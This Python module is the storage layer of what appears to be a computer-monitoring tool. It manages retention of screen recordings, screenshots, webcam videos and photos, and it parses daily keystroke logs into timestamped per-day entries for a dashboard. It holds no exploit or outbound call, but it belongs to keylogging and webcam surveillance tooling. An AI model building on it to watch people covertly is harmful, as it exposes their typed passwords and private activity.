"""
Storage manager – handles directory creation, retention policy (age + size),
and provides metadata queries used by the dashboard.
"""

import os
import time
import logging
import threading
from datetime import datetime
from pathlib import Path

import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config

logger = logging.getLogger(__name__)

def _all_dirs():
    return [
        config.RECORDINGS_DIR,
        config.SCREENSHOTS_DIR,
        config.LOGS_DIR,
        config.WEBCAM_DIR,
        config.WEBCAM_PHOTOS_DIR,
    ]


def ensure_directories():
    """Create all required storage directories if they do not exist."""
    for directory in _all_dirs():
        os.makedirs(directory, exist_ok=True)
    logger.info("Storage directories verified")


# ------------------------------------------------------------------
# Retention / cleanup
# ------------------------------------------------------------------

class StorageManager:
    """Periodically enforces the storage retention policy."""

    def __init__(self, check_interval: int = 3600):
        self._interval = check_interval
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self):
        ensure_directories()
        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._cleanup_loop, daemon=True, name="storage-cleanup"
        )
        self._thread.start()
        logger.info("StorageManager started")

    def stop(self):
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=10)
        logger.info("StorageManager stopped")

    def _cleanup_loop(self):
        while not self._stop_event.wait(self._interval):
            try:
                self._enforce_age_policy()
                self._enforce_size_policy()
            except Exception:
                logger.exception("Error during storage cleanup")

    def run_once(self):
        """Run a single cleanup pass (age + size) synchronously."""
        self._enforce_age_policy()
        self._enforce_size_policy()

    def _enforce_age_policy(self):
        # Use DELETE_DATA (days) as the retention period
        cutoff = time.time() - config.DELETE_DATA * 86400
        for directory in _all_dirs():
            for path in Path(directory).rglob("*"):
                if path.is_file() and path.stat().st_mtime < cutoff:
                    path.unlink(missing_ok=True)
                    logger.info("Removed aged file: %s", path)

    def _enforce_size_policy(self):
        max_bytes = config.MAX_STORAGE_MB * 1024 * 1024
        files = []
        for directory in _all_dirs():
            for path in Path(directory).rglob("*"):
                if path.is_file():
                    files.append(path)
        total = sum(p.stat().st_size for p in files)
        if total <= max_bytes:
            return
        # Sort oldest-first
        files.sort(key=lambda p: p.stat().st_mtime)
        for path in files:
            if total <= max_bytes:
                break
            size = path.stat().st_size
            path.unlink(missing_ok=True)
            total -= size
            logger.info("Removed file due to size limit: %s", path)


# ------------------------------------------------------------------
# Metadata helpers used by the dashboard
# ------------------------------------------------------------------

def _file_info(path: Path) -> dict:
    resolved = path.resolve()
    stat = resolved.stat()
    return {
        "name": resolved.name,
        "path": str(resolved),
        "size_bytes": stat.st_size,
        "modified": datetime.fromtimestamp(stat.st_mtime).strftime(
            "%Y-%m-%d %H:%M:%S"
        ),
    }


def list_screen_recordings() -> list[dict]:
    return _list_files(
        config.RECORDINGS_DIR,
        "*.mp4",
        exclude_suffixes=("_active.mp4",),
    )


def list_webcam_recordings() -> list[dict]:
    return _list_files(config.WEBCAM_DIR, "*.mp4")


def list_screenshots() -> list[dict]:
    return _list_files(config.SCREENSHOTS_DIR, "*.png")


def list_webcam_photos() -> list[dict]:
    return _list_files(config.WEBCAM_PHOTOS_DIR, "*.jpg")

def list_logs() -> list[dict]:
    return _list_files(config.LOGS_DIR, "*.log")


def get_keyboard_log_lines(max_lines: int = 500) -> list[str]:
    """Return the last *max_lines* lines across all daily keyboard log files."""
    base = Path(config.LOGS_DIR)
    if not base.exists():
        return []
    # Collect all keyboard.log files sorted oldest→newest
    log_files = sorted(base.rglob("keyboard.log"), key=lambda p: p.stat().st_mtime)
    lines: list[str] = []
    for log_path in log_files:
        try:
            with log_path.open("r", encoding="utf-8") as fh:
                lines.extend(fh.readlines())
        except OSError:
            pass
    return lines[-max_lines:]


def get_keyboard_log_by_day() -> list[dict]:
    """Return all keyboard log entries grouped by day.

    Each item in the returned list has:
      * ``date``    – date string ``YYYY-MM-DD``
      * ``entries`` – list of ``{"time": "HH:MM:SS", "key": str}`` dicts,
                      sorted oldest-first within the day

    Days are ordered oldest-first.  All daily log files are read in full –
    there is no row-count limit.
    """
    base = Path(config.LOGS_DIR)
    if not base.exists():
        return []

    # Group raw lines by calendar date
    day_map: dict[str, list[dict]] = {}
    for log_path in base.rglob("keyboard.log"):
        try:
            with log_path.open("r", encoding="utf-8") as fh:
                for raw in fh:
                    raw = raw.rstrip("\n")
                    if not raw:
                        continue
                    # Expected format: "YYYY-MM-DDTHH:MM:SS.ffffff key"
                    parts = raw.split(" ", 1)
                    if len(parts) != 2:
                        # Skip malformed lines
                        logger.debug("Skipping malformed keyboard log line: %r", raw)
                        continue
                    ts_part, key = parts[0], parts[1]
                    date_str = ts_part[:10]        # YYYY-MM-DD
                    time_str = ts_part[11:19]      # HH:MM:SS
                    day_map.setdefault(date_str, []).append({"time": time_str, "key": key})
        except OSError:
            pass

    # Return sorted by date
    return [
        {"date": date, "entries": entries}
        for date, entries in sorted(day_map.items())
    ]


def _list_files(
    directory: str,
    pattern: str,
    exclude_suffixes: tuple[str, ...] = (),
) -> list[dict]:
    results = []
    base = Path(directory)
    if not base.exists():
        return results
    # rglob recurses into YYYY/MM/DD subdirectories created by dated_subdir.
    # For typical monitoring deployments (≤12 months, daily dirs) the tree
    # depth is shallow (≤3 levels) and the file count manageable, so the
    # added stat overhead is acceptable.
    for path in sorted(base.rglob(pattern), key=lambda p: p.stat().st_mtime, reverse=True):
        if exclude_suffixes and any(path.name.endswith(suf) for suf in exclude_suffixes):
            continue
        results.append(_file_info(path))
    return results


def storage_summary() -> dict:
    total = 0
    for directory in _all_dirs():
        for path in Path(directory).rglob("*"):
            if path.is_file():
                total += path.stat().st_size
    return {
        "total_mb": round(total / (1024 * 1024), 2),
        "max_mb": config.MAX_STORAGE_MB,
        "recordings": len(list_screen_recordings()),
        "webcam": len(list_webcam_recordings()),
        "screenshots": len(list_screenshots()),
        "webcam_photos": len(list_webcam_photos()),
        "logs": len(list_logs()),
    }
